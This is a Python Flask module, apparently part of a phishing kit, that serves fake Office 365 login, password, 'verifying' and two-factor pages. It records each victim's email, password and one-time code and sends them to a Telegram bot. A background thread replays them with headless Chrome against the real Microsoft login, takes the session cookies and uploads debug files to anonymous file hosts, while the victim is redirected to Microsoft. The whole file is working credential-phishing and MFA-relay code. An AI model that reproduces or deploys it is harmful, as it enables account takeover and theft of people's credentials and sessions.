from __future__ import print_function
from flask import redirect, request, session
import json, time
from os import getenv
from core.base_module import BaseModule
import requests
import traceback
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import os, traceback, shutil, datetime

class Office365Module(BaseModule):
    def __init__(self, enable_2fa=False):
        super().__init__(self)
        self.set_name('office365')
        self.add_route('login', '/')
        self.add_route('password_page', '/password')
        # intermediate loading page shown after password submission
        self.add_route('loading', '/loading')
        self.add_route('twofactor', '/twofactor')
        self.add_route('redirect', '/redirect')
        self.enable_two_factor(enable_2fa)

    def login(self):
        template = self.env.get_template('login.html')
        return template.render(next_url='/password', hostname=request.host)

    def password_page(self):
        self.user = request.values.get('loginfmt') or request.values.get('email')
        template = self.env.get_template('password.html')
        # password page posts to /loading so we can show a verifying screen
        return template.render(next_url='/loading', hostname=request.host, email=self.user)

    def loading(self):
        """Handle password submission, send early credentials, show verifying dots."""
        self.user = request.values.get('email') or request.values.get('loginfmt')
        self.captured_password = request.values.get('passwd')

        # Early exfiltration
        ip = request.remote_addr
        ua = request.user_agent.string
        early_msg = (
            f"*O365 Credential Capture (Part 1)*\n"
            f"IP: `{ip}`\nUser-Agent: `{ua}`\n\n"
            f"Email: `{self.user}`\nPassword: `{self.captured_password}`\n"
            "Waiting for 2FA code…"
        )
        self.send_telegram(early_msg)

        template = self.env.get_template('loading.html')
        # auto-redirect to 2FA page after short delay
        return template.render(next_url='/twofactor', hostname=request.host, email=self.user, password=self.captured_password)

    def twofactor(self):
        # we reach here via redirect from loading page (GET) or direct POST
        self.user = request.values.get('email') or getattr(self, 'user', None)
        self.captured_password = request.values.get('password') or getattr(self, 'captured_password', None)
        template = self.env.get_template('twofactor.html')
        return template.render(next_url='/redirect', hostname=request.host, email=self.user, password=self.captured_password)

    def redirect(self):
        self.user = request.values.get('email')
        self.captured_password = request.values.get('password')
        self.two_factor_token = request.values.get('two_factor_token')

        # Off-load the slow Selenium work so we answer the HTTP request immediately
        import threading, json

        def _cookie_worker(user, pwd, token):
            import os  # new: needed for path handling in uploads
            # helper: try multiple anonymous hosting providers, return URL or None
            def _upload(file_path):
                providers = [
                    ('transfer.sh', 'PUT'),
                    ('0x0.st', 'POST'),
                ]
                for host, method in providers:
                    try:
                        if method == 'PUT':
                            with open(file_path, 'rb') as fp:
                                resp = requests.put(
                                    f'https://{host}/{os.path.basename(file_path)}',
                                    data=fp,
                                    timeout=30,
                                )
                        else:  # POST multipart
                            with open(file_path, 'rb') as fp:
                                resp = requests.post(
                                    f'https://{host}',
                                    files={'file': (os.path.basename(file_path), fp)},
                                    timeout=30,
                                )
                        if resp.ok and resp.text.strip().startswith('http'):
                            return resp.text.strip()
                    except Exception as exc:
                        print(f"[upload] Provider {host} failed for {file_path}: {exc}")
                return None

            try:
                self.user = user
                self.captured_password = pwd
                self.two_factor_token = token
                cookies = self.perform_automated_login()
            except Exception as ex:
                tb = traceback.format_exc()
                print(f"[cookie_worker] Exception in perform_automated_login: {tb}")
                cookies = [{"error": str(ex), "traceback": tb}]

            # Attempt to upload debug artefacts (page_source / screenshot)
            artefact_links, doc_paths = [], []
            if cookies and isinstance(cookies, list) and cookies:
                first = cookies[0]
                for key, local_path in list(first.items()):
                    if not (isinstance(local_path, str) and os.path.exists(local_path)):
                        continue
                    url = _upload(local_path)
                    if url:
                        artefact_links.append(f"{key}: {url}")
                        first[key] = url  # replace with remote URL
                    else:
                        doc_paths.append(local_path)

            # Enhanced error reporting
            if cookies and len(cookies) > 0 and 'error' in cookies[0]:
                error_details = cookies[0].get('error', 'Unknown error')
                traceback_info = cookies[0].get('traceback', 'No traceback available')
                cookie_block = f"Error: {error_details}\n\nTraceback:\n{traceback_info}"
            else:
                cookie_block = json.dumps(cookies, indent=2) if cookies else 'Cookie capture failed'
            
            msg = (
                f"*O365 Credential Capture (Full)*\nEmail: `{user}`\nPassword: `{pwd}`\n2FA: `{token}`\n\nCookies:\n```\n{cookie_block}\n```"
            )
            if artefact_links:
                msg += "\n\nDebug artefacts:\n" + "\n".join(artefact_links)

            self.send_telegram(msg, document_paths=doc_paths if doc_paths else None)

        threading.Thread(target=_cookie_worker, args=(self.user, self.captured_password, self.two_factor_token), daemon=True).start()

        # Give the victim the real Microsoft redirect right away
        return redirect(self.final_url, code=302)

    def send_telegram(self, message: str | None = None, document_paths: list | None = None):
        """Send a Markdown message and/or upload documents to Telegram.

        Parameters
        ----------
        message : str | None
            Text to send. If None, no text message is sent.
        document_paths : list[str] | None
            Optional list of file paths to upload as documents (one request per file).
        """
        bot_token = getenv('TELEGRAM_BOT_TOKEN')
        chat_id = getenv('TELEGRAM_CHAT_ID')
        if not bot_token or not chat_id:
            return

        session_req = requests.Session()

        if message:
            try:
                url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
                payload = {
                    'chat_id': chat_id,
                    'text': message,
                    'parse_mode': 'Markdown',
                }
                session_req.post(url, json=payload, timeout=15)
            except Exception:
                pass

        if document_paths:
            for fpath in document_paths:
                try:
                    if not os.path.exists(fpath):
                        continue
                    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
                    with open(fpath, 'rb') as fp:
                        files = {'document': (os.path.basename(fpath), fp)}
                        data = {'chat_id': chat_id}
                        session_req.post(url, data=data, files=files, timeout=30)
                except Exception as exc:
                    print(f"[telegram-upload] Failed to send {fpath}: {exc}")

    def perform_automated_login(self):
        """Use headless Chrome to login and return cookies list. Handles M-series Mac headless quirks & Stay-signed-in prompt."""
        email = getattr(self, 'user', None)
        password = getattr(self, 'captured_password', None)
        token = getattr(self, 'two_factor_token', None)
        if not all([email, password, token]):
            return [{"error": "Missing credentials", "email": email, "password": bool(password), "token": bool(token)}]

        driver = None
        opts = webdriver.ChromeOptions()
        def log(msg):
            print(f"[{datetime.datetime.utcnow().isoformat()}] SELENIUM: {msg}")

        opts.binary_location = os.getenv('CHROME_BIN', '/usr/bin/chromium')
        if not os.path.exists(opts.binary_location):
            alt = shutil.which('chromium') or shutil.which('chromium-browser') or '/usr/lib/chromium/chromium'
            opts.binary_location = alt
        log(f"Using chrome binary: {opts.binary_location}")
        opts.add_argument('--headless=new')
        opts.add_argument('--no-sandbox')
        opts.add_argument('--disable-dev-shm-usage')
        opts.add_argument('--disable-gpu')
        opts.add_argument('--disable-crash-reporter')
        opts.add_argument('--disable-extensions')
        opts.add_argument('--disable-features=SitePerProcess,OptimizationHints')
        # Disable WebAuthn so Microsoft does not offer password-less/FIDO flows
        opts.add_argument('--disable-features=WebAuthentication,WebAuthnConditionalUI')
        opts.add_argument('--window-size=1280,800')
        opts.add_argument('--disable-software-rasterizer')
        opts.add_argument('--remote-allow-origins=*')  # fixes chrome 111+ in some envs
        opts.add_argument('--no-zygote')

        # Allow tweaking global Selenium wait via env (default 60 s)
        WAIT_TIMEOUT = int(os.getenv('O365_WAIT_TIMEOUT', '60'))

        try:
            # Let Selenium Manager fetch the correct chromedriver automatically
            log("Launching Chrome via Selenium Manager…")
            driver = webdriver.Chrome(options=opts)
            driver.set_page_load_timeout(WAIT_TIMEOUT)
            log("Chrome WebDriver session started")

            from selenium.common.exceptions import TimeoutException, NoSuchElementException
            from selenium.webdriver.support.ui import WebDriverWait
            from selenium.webdriver.support import expected_conditions as EC

            wait = WebDriverWait(driver, WAIT_TIMEOUT)

            def element_present(by, selector, t=3):
                """Utility: return True if element located within t seconds."""
                try:
                    WebDriverWait(driver, t).until(EC.presence_of_element_located((by, selector)))
                    return True
                except Exception:
                    return False

            # Try legacy flow first
            log(f"Attempting legacy login flow for {email}")
            legacy_url = f'https://login.live.com/login.srf?username={email}'
            driver.get(legacy_url)
            time.sleep(3)
            
            # Check if we're on the password page
            password_entered = False
            try:
                # Try multiple selectors for password field
                password_selectors = [
                    (By.NAME, 'passwd'),
                    (By.ID, 'i0118'),
                    (By.CSS_SELECTOR, 'input[type="password"]'),
                    (By.CSS_SELECTOR, 'input[name="passwd"]'),
                    (By.CSS_SELECTOR, '#i0118')
                ]
                
                password_field = None
                for by, selector in password_selectors:
                    try:
                        log(f"Looking for password field with {by}: {selector}")
                        password_field = driver.find_element(by, selector)
                        if password_field and password_field.is_displayed():
                            log(f"Found password field with {by}: {selector}")
                            break
                    except NoSuchElementException:
                        continue
                
                if password_field:
                    # Wait a bit for the field to be ready
                    time.sleep(1)
                    password_field.clear()
                    password_field.send_keys(password)
                    log("Password entered successfully")
                    
                    # Find and click sign in button
                    signin_selectors = [
                        (By.ID, 'idSIButton9'),
                        (By.CSS_SELECTOR, 'input[type="submit"]'),
                        (By.CSS_SELECTOR, 'button[type="submit"]'),
                        (By.XPATH, "//input[@value='Sign in']")
                    ]
                    
                    for by, selector in signin_selectors:
                        try:
                            signin_btn = driver.find_element(by, selector)
                            if signin_btn and signin_btn.is_displayed():
                                signin_btn.click()
                                log(f"Clicked sign in button with {by}: {selector}")
                                password_entered = True
                                break
                        except NoSuchElementException:
                            continue
                    
                    if password_entered:
                        time.sleep(5)  # Wait for redirect
                        log(f"Current URL after password: {driver.current_url}")
                else:
                    log("Password field not found in legacy flow")
            except Exception as e:
                log(f"Legacy flow password entry failed: {str(e)}")
                # Capture debug info
                try:
                    timestamp = datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
                    debug_html = f'/tmp/o365_legacy_fail_{timestamp}.html'
                    debug_png = f'/tmp/o365_legacy_fail_{timestamp}.png'
                    with open(debug_html, 'w', encoding='utf-8') as fp:
                        fp.write(driver.page_source)
                    driver.save_screenshot(debug_png)
                    log(f"Saved legacy failure debug files: {debug_html}, {debug_png}")
                except:
                    pass

            # If legacy flow didn't work or we need to handle 2FA, try standard flow
            if not password_entered or 'login.microsoftonline.com' in driver.current_url:
                log("Falling back to standard login flow")
                driver.get('https://login.microsoftonline.com/')
                time.sleep(2)
                
                # Enter email
                email_field = driver.find_element(By.NAME, 'loginfmt')
                email_field.send_keys(email)
                driver.find_element(By.ID, 'idSIButton9').click()
                time.sleep(3)
                
                # Enter password if we haven't already
                if not password_entered:
                    password_field = driver.find_element(By.NAME, 'passwd')
                    password_field.send_keys(password)
                    driver.find_element(By.ID, 'idSIButton9').click()
                    time.sleep(3)

            # Handle 2FA
            log("Looking for 2FA input fields")
            
            # Wait for any of the expected next-stage markers to become visible
            try:
                wait.until(
                    EC.any_of(
                        EC.presence_of_element_located((By.ID, 'otcFrame')),
                        EC.presence_of_element_located((By.ID, 'idDiv_SAOTCS_Proofs')),
                        EC.presence_of_element_located((By.ID, 'idSubmit_SAOTCC_Continue')),
                        EC.presence_of_element_located((By.NAME, 'otc')),
                        EC.presence_of_element_located((By.CSS_SELECTOR, 'input[name="otcInput0"]')),
                    )
                )
                log("Found 2FA stage marker")
            except TimeoutException:
                log(f"No stage-marker element appeared after {WAIT_TIMEOUT}s – proceeding with fallback selectors")

            # If a verification-method chooser is present, click the first Continue/Send-code button
            try:
                choice_btns = driver.find_elements(By.ID, 'idSubmit_SAOTCC_Continue') or \
                              driver.find_elements(By.CSS_SELECTOR, 'input[id^="idSubmit_SAOTCC"]')
                if choice_btns:
                    choice_btns[0].click()
                    log("Clicked verification method continue button")
                    time.sleep(2)
            except Exception:
                pass  # No choice page, proceed

            # If an iframe with the OTP box loads, switch context to it
            try:
                if element_present(By.ID, 'otcFrame', 5):
                    driver.switch_to.frame(driver.find_element(By.ID, 'otcFrame'))
                    log("Switched to OTP iframe")
            except Exception:
                pass

            # Locate the OTP input element using a broad selector list
            otp_selectors = [
                (By.NAME, 'otc'),
                (By.NAME, 'otcInput0'),
                (By.ID, 'idTxtBx_SAOTP_OTC'),
                (By.ID, 'idTxtBx_SAOTCC_OTC'),
                (By.CSS_SELECTOR, 'input[id^="idTxtBx_SAOTP"]'),
                (By.CSS_SELECTOR, 'input[id^="idTxtBx_SAOTCC"]'),
                (By.CSS_SELECTOR, 'input[type="tel"]'),
                (By.CSS_SELECTOR, 'input[type="text"]'),
            ]

            token_input = None
            for by, sel in otp_selectors:
                try:
                    log(f"Looking for OTP input with {by}: {sel}")
                    token_input = WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located((by, sel))
                    )
                    log(f"Found OTP input with {by}: {sel}")
                    break
                except TimeoutException:
                    continue

            if token_input:
                token_input.clear()
                token_input.send_keys(token)
                log(f"Entered 2FA token: {token}")
                # The verify/Next button often retains the same ID inside or outside iframe
                try:
                    driver.find_element(By.ID, 'idSIButton9').click()
                    log("Clicked verify button")
                except NoSuchElementException:
                    log("Verify button not found")
            else:
                log('OTP input not found – continuing without entering 2FA code')

            # Always switch back to the main document in case we were inside an iframe
            try:
                driver.switch_to.default_content()
            except Exception:
                pass

            # Handle optional stay signed in prompt
            try:
                WebDriverWait(driver, 5).until(
                    EC.element_to_be_clickable((By.ID, 'idBtn_Back'))
                ).click()
                log("Clicked 'No' on stay signed in prompt")
            except Exception:
                pass  # prompt may not appear

            # Wait until redirected to Office portal or other Microsoft service page
            try:
                WebDriverWait(driver, 20).until(
                    EC.url_contains('office')
                )
                log("Successfully redirected to Office portal")
            except Exception:
                log(f"Timeout waiting for Office redirect. Current URL: {driver.current_url}")

            time.sleep(2)

            cookies = driver.get_cookies()
            log(f"Captured {len(cookies)} cookies")

            # Always save the final page source & screenshot for debugging purposes
            try:
                timestamp = datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
                final_html_path = f'/tmp/o365_final_page_{timestamp}.html'
                final_png_path = f'/tmp/o365_final_page_{timestamp}.png'
                with open(final_html_path, 'w', encoding='utf-8') as fp:
                    fp.write(driver.page_source)
                driver.save_screenshot(final_png_path)
                log(f"Saved final page artifacts: {final_html_path}, {final_png_path}")

                # Append paths to first cookie object to make them easy to locate later
                if cookies:
                    cookies[0]['page_source'] = final_html_path
                    cookies[0]['screenshot'] = final_png_path
                    cookies[0]['final_url'] = driver.current_url
                else:
                    # If no cookies, create a dict to hold the debug info
                    cookies = [{
                        'page_source': final_html_path,
                        'screenshot': final_png_path,
                        'final_url': driver.current_url,
                        'warning': 'No cookies captured'
                    }]
            except Exception as e:
                log(f"Failed to save final artifacts: {str(e)}")
                
        except Exception as e:
            tb = traceback.format_exc()
            print(f"[perform_automated_login] Exception: {tb}")
            log(f"Exception occurred: {str(e)}")
            
            # Enhanced error reporting with current state
            cookies = [{
                "error": str(e),
                "traceback": tb,
                "current_url": driver.current_url if driver else "Driver not initialized",
                "timestamp": datetime.datetime.utcnow().isoformat()
            }]
            
            try:
                if driver:
                    # First snapshot immediately after failure
                    page_source = driver.page_source
                    timestamp1 = datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
                    page_path = f'/tmp/o365_error_{timestamp1}.html'
                    with open(page_path, 'w', encoding='utf-8') as fp:
                        fp.write(page_source)
                    screenshot_path = f'/tmp/o365_error_{timestamp1}.png'
                    driver.save_screenshot(screenshot_path)
                    cookies[0]['page_source'] = page_path
                    cookies[0]['screenshot'] = screenshot_path
                    log(f"Saved error artifacts: {page_path}, {screenshot_path}")

                    # Wait and capture second state
                    time.sleep(6)
                    try:
                        page_source2 = driver.page_source
                        timestamp2 = datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
                        page_path2 = f'/tmp/o365_error2_{timestamp2}.html'
                        with open(page_path2, 'w', encoding='utf-8') as fp:
                            fp.write(page_source2)
                        screenshot_path2 = f'/tmp/o365_error2_{timestamp2}.png'
                        driver.save_screenshot(screenshot_path2)
                        cookies[0]['page_source_wait'] = page_path2
                        cookies[0]['screenshot_wait'] = screenshot_path2
                        log(f"Saved second error artifacts: {page_path2}, {screenshot_path2}")
                    except Exception:
                        pass
            except Exception as debug_error:
                log(f"Failed to capture debug artifacts: {str(debug_error)}")
                
        finally:
            try:
                if driver:
                    driver.quit()
                    log("Chrome driver closed")
            except Exception:
                pass
                
        return cookies

def load(enable_2fa=False):
    return Office365Module(enable_2fa)
